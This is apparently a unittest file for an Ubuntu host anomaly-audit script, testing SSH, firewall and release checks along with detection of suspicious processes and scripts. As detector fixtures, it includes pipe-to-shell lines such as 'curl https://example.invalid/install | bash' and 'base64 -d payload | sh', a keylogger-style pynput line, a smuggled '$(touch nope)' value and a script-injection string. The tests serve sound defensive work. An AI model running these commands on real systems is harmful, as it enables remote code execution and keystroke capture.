"""Fixtures use temporary files and read-only subprocess examples, never remediation."""
import datetime as dt
import hashlib
import importlib.util
import json
import os
from pathlib import Path
import subprocess
import sys
import tempfile
import unittest
from unittest import mock

ROOT = Path(__file__).resolve().parents[1]
spec = importlib.util.spec_from_file_location("audit", ROOT / "ubuntu_anomaly_audit.py")
a = importlib.util.module_from_spec(spec); spec.loader.exec_module(a)


class PureRules(unittest.TestCase):
    def test_os_release_no_shell_evaluation(self):
        value = a.parse_os_release('ID=ubuntu\nVERSION_ID="25.10"\nEXTRA="$(touch nope)"')
        self.assertEqual(value["VERSION_ID"], "25.10")
        self.assertEqual(value["EXTRA"], "$(touch nope)")

    def test_eol_dates_exact(self):
        self.assertFalse(a.release_findings({"ID":"ubuntu","VERSION_ID":"25.04"},dt.date(2026,1,14)))
        self.assertTrue(a.release_findings({"ID":"ubuntu","VERSION_ID":"25.04"},dt.date(2026,1,15)))
        self.assertTrue(a.release_findings({"ID":"ubuntu","VERSION_ID":"25.10"},dt.date(2026,11,16)))
        self.assertFalse(a.release_findings({"ID":"debian","VERSION_ID":"25.10"},dt.date(2026,11,16)))

    def test_normal_ssh_not_noisy(self):
        self.assertFalse(a.ssh_findings('permitrootlogin prohibit-password\npasswordauthentication yes\npermitemptypasswords no'))

    def test_root_password_and_empty_password_settings(self):
        output=a.ssh_findings('permitrootlogin yes\npasswordauthentication yes\npermitemptypasswords yes')
        self.assertEqual(len(output),2)
        self.assertTrue(all(item['priority']=='High' for item in output))

    def test_ufw_inactive_alone_never_proves_no_firewall(self):
        self.assertFalse(a.firewall_finding('unknown',{'nft':False},'inactive'))
        self.assertFalse(a.firewall_finding('required',{'nft':True,'iptables':False},'inactive'))
        self.assertFalse(a.firewall_finding('required',{'nft':None,'iptables':False},'inactive'))
        self.assertEqual(len(a.firewall_finding('required',{'nft':False,'iptables':False},'inactive')),1)

    def test_empty_nft_and_input_drop(self):
        self.assertIs(a.nft_input_state({'nftables':[]}),False)
        data={'nftables':[{'chain':{'family':'inet','table':'filter','name':'input','hook':'input','policy':'drop'}}]}
        self.assertIs(a.nft_input_state(data),True)

    def test_complex_nft_stays_unknown_not_safe_or_unfiltered(self):
        data={'nftables':[{'chain':{'family':'inet','table':'f','name':'input','hook':'input','policy':'accept'}},{'rule':{'family':'inet','table':'f','chain':'input','expr':[{'jump':{'target':'other'}}]}}]}
        self.assertIsNone(a.nft_input_state(data))
        self.assertIsNone(a.nft_input_state({'wrong':'schema'}))

    def test_forward_only_does_not_prove_host_input_filtering(self):
        data={'nftables':[{'chain':{'family':'inet','table':'f','name':'docker','hook':'forward','policy':'drop'}}]}
        self.assertIs(a.nft_input_state(data),False)

    def test_iptables_input_policy(self):
        self.assertIs(a.iptables_input_state('*filter\n:INPUT DROP [0:0]\nCOMMIT\n'),True)
        self.assertIs(a.iptables_input_state('*filter\n:INPUT ACCEPT [0:0]\nCOMMIT\n'),False)
        self.assertIsNone(a.iptables_input_state('*filter\n:INPUT ACCEPT [0:0]\n-A INPUT -j custom\nCOMMIT\n'))

    def test_behavior_patterns_and_benign_jobs(self):
        self.assertFalse(a.behavior_signals('/usr/bin/python3 /usr/bin/unattended-upgrade'))
        self.assertTrue(a.behavior_signals('curl https://example.invalid/install | bash'))
        self.assertTrue(a.behavior_signals('base64 -d payload | sh'))
        self.assertTrue(a.behavior_signals('from pynput import keyboard; keyboard.Listener(on_press=handle)'))
        self.assertFalse(a.behavior_signals('A comment naming XRecordCreateContext'))

    def test_native_program_arguments_are_not_treated_as_scripts(self):
        self.assertIsNone(a.script_target(['/usr/bin/cat','/etc/shadow'],'/'))
        self.assertEqual(a.script_target(['/opt/custom.py'],'/'),'/opt/custom.py')

    def test_script_path_and_runtime(self):
        self.assertEqual(a.runtime(['/usr/bin/python3.13','/opt/app.py']),'Python')
        self.assertEqual(a.script_target(['/usr/bin/python3','app.py'],'/opt'),'/opt/app.py')
        self.assertIsNone(a.script_target(['/usr/bin/python3','-m','http.server'],'/opt'))
        self.assertEqual(a.runtime(['/usr/sbin/cron','-f']),'')


class FileAndProcessTests(unittest.TestCase):
    def setUp(self):
        self.tmp=tempfile.TemporaryDirectory(); self.addCleanup(self.tmp.cleanup)
        self.path=Path(self.tmp.name); self.audit=a.Audit(); self.audit.output=self.path
        self.audit.package_owner=lambda path:''

    def test_symlinks_and_nonregular_files_skipped(self):
        target=self.path/'payload.py';target.write_text('print("hello")')
        link=self.path/'link.py';link.symlink_to(target)
        self.assertIsNone(self.audit.read(str(link)))
        self.assertIsNone(self.audit.read('/dev/null'))
        fifo=self.path/'fifo';os.mkfifo(fifo)
        self.assertIsNone(self.audit.read(str(fifo)))

    def test_parent_symlinks_skipped(self):
        directory=self.path/'real';directory.mkdir();(directory/'x').write_text('secret')
        (self.path/'alias').symlink_to(directory,target_is_directory=True)
        self.assertIsNone(self.audit.read(str(self.path/'alias/x')))

    def test_file_read_bound(self):
        path=self.path/'large.py';path.write_bytes(b'x'*1025)
        self.assertIsNone(self.audit.read(str(path),limit=1024))

    def test_hash_is_exact_bytes_not_decoded_text(self):
        path=self.path/'sample.py';data=b'print("hello")\r\n#\xff';path.write_bytes(data)
        self.assertEqual(self.audit.file_fact(str(path))['sha256'],hashlib.sha256(data).hexdigest())

    def test_no_observed_payload_execution(self):
        self.audit.analyze_artifact('test','cron','curl https://example.invalid/x | bash','fixture',privileged=True)
        self.assertEqual(len(self.audit.findings),1)
        self.assertEqual(self.audit.commands,{})

    def test_privileged_temporary_native_payload(self):
        self.audit.analyze_artifact('test','unit','/tmp/native-implant','fixture',privileged=True)
        self.assertEqual(len(self.audit.findings),1)
        self.assertIn('temporary',self.audit.findings[0]['why'])

    def test_packaged_python_is_not_flagged_just_for_running(self):
        script=self.path/'system.py';script.write_text('print("normal")')
        self.audit.package_owner=lambda path:'example-package: '+path
        process=dict(pid=999991,parent=1,uid=0,exe='/usr/bin/python3',cwd='/',argv=['/usr/bin/python3',str(script)],sockets=[])
        self.audit.analyze_processes([process],[])
        self.assertEqual(self.audit.findings,[])

    def test_package_ownership_never_suppresses_stronger_code(self):
        script=self.path/'system.py';script.write_text('from pynput import keyboard; keyboard.Listener(on_press=handle)')
        self.audit.package_owner=lambda path:'example-package: '+path
        process=dict(pid=999991,parent=1,uid=0,exe='/usr/bin/python3',cwd='/',argv=['/usr/bin/python3',str(script)],sockets=[])
        self.audit.analyze_processes([process],[])
        self.assertEqual(len(self.audit.findings),1)
        self.assertEqual(self.audit.findings[0]['kind'],'ThreatEvidence')

    def test_root_temporary_native_execution_is_a_specific_lead(self):
        process=dict(pid=999991,parent=1,uid=0,exe='/tmp/example-native',cwd='/',argv=['/tmp/example-native'],sockets=[])
        self.audit.analyze_processes([process],[])
        self.assertEqual(len(self.audit.findings),1)
        self.assertEqual(self.audit.findings[0]['kind'],'ThreatEvidence')

    def test_custom_script_workers_grouped(self):
        p=dict(pid=999991,parent=1,uid=1000,exe='/usr/bin/python3',cwd='/opt',argv=['/usr/bin/python3','-m','custom.module'],sockets=[])
        self.audit.analyze_processes([p,dict(p,pid=999992)],[])
        self.assertEqual(len(self.audit.findings),1)
        self.assertIn('999992',self.audit.findings[0]['why'])

    def test_current_auditor_process_excluded(self):
        p=dict(pid=os.getpid(),parent=1,uid=1000,exe='/usr/bin/python3',cwd='/',argv=['/usr/bin/python3','audit.py'],sockets=[])
        self.audit.analyze_processes([p],[])
        self.assertEqual(self.audit.findings,[])

    def test_runner_is_direct_and_output_bounded(self):
        self.audit.tool_cache['fixture']=sys.executable
        self.assertEqual(self.audit.run('fixture',['-c','print("fixture")']),'fixture\n')
        self.assertIsNone(self.audit.run('fixture',['-c','print("x"*100000)'],limit=512))
        self.assertTrue(any('capture limit' in c['detail'] for c in self.audit.coverage))

    def test_existing_output_file_never_overwritten(self):
        self.audit.save('test.json',{'test':True})
        with self.assertRaises(FileExistsError):self.audit.save('test.json',{})
        self.assertEqual(json.loads((self.path/'test.json').read_text()),{'test':True})
        self.assertEqual((self.path/'test.json').stat().st_mode & 0o777,0o600)

    def test_html_escapes_payload_and_has_no_raw_inventory(self):
        f=a.finding('Persistence','High','fixture','Example','<script>window.injected=1</script>','evidence','verify')
        report=a.render_report('host',[f],[])
        self.assertNotIn('<script>window.injected=1</script>',report)
        self.assertIn('&lt;script&gt;',report)
        self.assertNotIn('<pre>',report)
        self.assertNotIn('ProcessesFinal.json',report)
        self.assertIn('reset',report)


if __name__=='__main__':unittest.main()
